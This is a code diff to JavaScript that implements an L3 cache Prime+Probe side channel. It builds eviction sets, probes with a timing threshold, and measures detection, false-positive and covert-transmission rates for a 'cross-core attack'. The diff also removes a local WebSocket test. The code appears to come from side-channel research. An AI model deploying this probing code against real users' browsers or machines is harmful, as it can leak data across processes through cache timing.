@@ -308,7 +308,7 @@ class EvictionListL3 {
 
     probe(){
         let element = this.head;
-        let THRESHOLD = 60;
+        let THRESHOLD = 50;
         let ret = 0;
         while (element !== END_MARKER) {
             /* use Atomics.load to prevent zeroing out */
@@ -451,110 +451,20 @@ async function l3pp_main(options){
     });
 
     let evset = new EvictionListL3(buffer, sets[0]); 
-    let end, start; 
-
-    start = Atomics.load(buffer, 64)
-    evset.traverse()
-    end = Atomics.load(buffer, 64)
-    log(end-start)
-
-    start = Atomics.load(buffer, 64)
-    evset.traverse()
-    end = Atomics.load(buffer, 64)
-    log(end-start)
-    
 
     let TRIALS = 250, WARMUP_ROUNDS = 100, THRESHOLD = 60;
     let VICTIM = 8128;
-    /* compute background noise from false-positives */
-    let fp = 0;
-    for(let i = 0; i < WARMUP_ROUNDS; i++){
-        result = evset.probe();
-    }
-    for(let i = 0; i < TRIALS; i++){
-        let result = evset.probe()
-        fp += result; 
-        evset.probe();
-    }
-    log(`false-positive: ${fp/TRIALS}`)
+
+    ipdft_out = intra_process_detection_fp_test(evset, buffer, WARMUP_ROUNDS, TRIALS, VICTIM);
+    log("detection-rate: " + ipdft_out[0]);
+    log("false-positive-rate: " + ipdft_out[1]);
 
     /* compute detection rate */
-    let detect = 0;
-    for(let i = 0; i < WARMUP_ROUNDS; i++){
-        result = evset.probe();
-    }
-    for(let i = 0; i < TRIALS; i++){
-        let tmp = Atomics.load(buffer, VICTIM / 4);
-        let result = evset.probe();
-        detect += result; 
-        evset.probe()
-    }
-    log(`detections: ${detect/TRIALS}`)
+    let TRANSMIT_ROUNDS_SIDE = 256
+    intra_process_transmission_test(evset, buffer, WARMUP_ROUNDS, TRANSMIT_ROUNDS_SIDE, VICTIM);
 
-    let fp_rate = fp / TRIALS;
-    let detect_rate = detect / TRIALS;
+    remote_set_profiling(evset);
 
-    if(detect_rate > 0.75 && fp_rate < 0.4){
-        log(detect_rate)
-        log(fp_rate)
-        /* compute detection rate */
-        let TRANSMIT_ROUNDS_SIDE = 256
-        let transmit_str = ""
-        for(let i = 0; i < WARMUP_ROUNDS; i++){
-            evset.probe();
-        }
-
-        let correct = 0;
-        let fp = 0;
-        let detect = 0;
-        for(let i = 0; i < TRANSMIT_ROUNDS_SIDE; i++){
-            for(let j = 0; j < TRANSMIT_ROUNDS_SIDE; j++){
-                let expected = 0;
-                evset.probe();
-                if((i * TRANSMIT_ROUNDS_SIDE + j) % 8 == 0){
-                    expected = 1;
-                    let tmp = Atomics.load(buffer, VICTIM/4);
-                }
-                let result = evset.probe();
-                correct += (result == expected)
-                if(expected){
-                    detect += (result == expected) 
-                } else{
-                    fp += (result != expected)
-                }
-                // transmit_str += result + " "; 
-            }
-            // transmit_str += "\n" 
-        }   
-        // log(transmit_str)
-        log(`Overall Accuracy: ${correct / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE)}`)
-        log(`Detection Rate: ${detect / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE / 8)}`)
-        log(`False-Positive Rate: ${fp / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE / 8 * 7)}`)
-        log("start cross-core attack, please begin transmitting process")
-        transmit_str = "";
-        for(let i  = 0; i < 10; i++){
-            evset.probe();
-        }
-
-        const socket = new WebSocket("ws://localhost:8000")
-        socket.addEventListener("open", () => {
-            socket.send("Hello World!")
-        })
-
-        socket.addEventListener("message", (event)=>{
-            log("Server message: " + event.data)
-        })
-
-        while(true){
-            count = 0;
-            for(let i = 0; i < TRANSMIT_ROUNDS_SIDE; i++){
-                for(let j = 0; j < TRANSMIT_ROUNDS_SIDE; j++){
-                    count += evset.probe();
-                }
-            }
-            log("detection-rate: " + count / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE))
-        }
-    }
     await stopTimer();
 }
 
@@ -576,6 +486,84 @@ function cross_core_test(evset){
         transmit_str += "\n";
     }
     log(transmit_str)
+}
+
+function intra_process_detection_fp_test(evset, buffer, warmup_rounds, trials, victim){
+    /* compute background noise from false-positives */
+    let fp = 0;
+    for(let i = 0; i < warmup_rounds; i++){
+        result = evset.probe();
+    }
+    for(let i = 0; i < trials; i++){
+        let result = evset.probe()
+        fp += result; 
+        evset.probe();
+    }
+    log(`false-positive: ${fp/trials}`)
+
+    /* compute detection rate */
+    let detect = 0;
+    for(let i = 0; i < warmup_rounds; i++){
+        result = evset.probe();
+    }
+    for(let i = 0; i < trials; i++){
+        let tmp = Atomics.load(buffer, victim / 4);
+        let result = evset.probe();
+        detect += result; 
+        evset.probe()
+    }
+    log(`detections: ${detect/trials}`)
+
+    let fp_rate = fp / trials;
+    let detect_rate = detect / trials;
+    return [detect_rate, fp_rate]
+}
+
+function intra_process_transmission_test(evset, buffer, warmup_rounds, transmit_rounds_side, victim){
+    let correct = 0;
+    let fp = 0;
+    let detect = 0;
+    for(let i = 0; i < warmup_rounds; i++){
+        evset.probe();
+    }
+    for(let i = 0; i < transmit_rounds_side; i++){
+        for(let j = 0; j < transmit_rounds_side; j++){
+            let expected = 0;
+            evset.probe();
+            if((i * transmit_rounds_side + j) % 8 == 0){
+                expected = 1;
+                let tmp = Atomics.load(buffer, victim/4);
+            }
+            let result = evset.probe();
+            correct += (result == expected)
+            if(expected){
+                detect += (result == expected) 
+            } else{
+                fp += (result != expected)
+            }
+        }
+    }   
+    log(`Overall Accuracy: ${correct / (transmit_rounds_side * transmit_rounds_side)}`)
+    log(`Detection Rate: ${detect / (transmit_rounds_side * transmit_rounds_side / 8)}`)
+    log(`False-Positive Rate: ${fp / (transmit_rounds_side * transmit_rounds_side / 8 * 7)}`)
+    log("start cross-core attack, please begin transmitting process")
+}
+
+function remote_set_profiling(evset){
+    let TRANSMIT_ROUNDS_SIDE = 256;
+    for(let i  = 0; i < 10; i++){
+        evset.probe();
+    }
+
+    while(true){
+        let count = 0;
+        for(let i = 0; i < TRANSMIT_ROUNDS_SIDE; i++){
+            for(let j = 0; j < TRANSMIT_ROUNDS_SIDE; j++){
+                count += evset.probe();
+            }
+        }
+        log("detection-rate: " + count / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE))
+    }
 }
 
 l3pp_main({offset:63})
